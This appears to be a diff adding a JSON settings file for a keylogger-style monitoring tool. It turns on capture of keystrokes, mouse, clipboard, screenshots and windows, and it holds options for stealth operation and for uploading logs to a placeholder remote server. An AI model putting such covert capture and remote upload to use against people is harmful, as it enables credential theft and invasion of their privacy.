@@ -1,0 +1,77 @@
+{
+  "logging": {
+    "level": "INFO",
+    "file_path": "keylog.txt",
+    "max_file_size_mb": 100,
+    "backup_count": 5,
+    "buffer_size": 10,
+    "flush_interval_seconds": 10
+  },
+  "encryption": {
+    "enabled": true,
+    "key_file": "encryption.key",
+    "algorithm": "fernet"
+  },
+  "features": {
+    "key_logging": true,
+    "mouse_logging": true,
+    "clipboard_logging": true,
+    "screenshots": true,
+    "usb_monitoring": true,
+    "network_logging": false,
+    "window_tracking": true
+  },
+  "privacy": {
+    "sanitize_passwords": true,
+    "hash_sensitive_data": true,
+    "max_clipboard_length": 1000,
+    "excluded_applications": [
+      "KeePass",
+      "1Password",
+      "Bitwarden",
+      "LastPass"
+    ],
+    "sensitive_keywords": [
+      "password",
+      "ssn",
+      "credit card",
+      "social security"
+    ]
+  },
+  "performance": {
+    "screenshot_interval_seconds": 30,
+    "window_check_interval_seconds": 5,
+    "clipboard_check_interval_seconds": 3,
+    "max_memory_usage_mb": 500,
+    "thread_pool_size": 4
+  },
+  "remote_logging": {
+    "enabled": false,
+    "server_url": "https://your-server.com/api/logs",
+    "api_key": "",
+    "batch_size": 50,
+    "retry_attempts": 3,
+    "timeout_seconds": 30
+  },
+  "alerts": {
+    "email_enabled": false,
+    "email_recipient": "",
+    "smtp_server": "",
+    "smtp_port": 587,
+    "smtp_username": "",
+    "smtp_password": ""
+  },
+  "stealth_mode": {
+    "enabled": false,
+    "hide_console": true,
+    "run_as_service": false
+  },
+  "web_interface": {
+    "enabled": false,
+    "host": "127.0.0.1",
+    "port": 8080,
+    "auth_required": true,
+    "username": "admin",
+    "password_hash": ""
+  }
+}
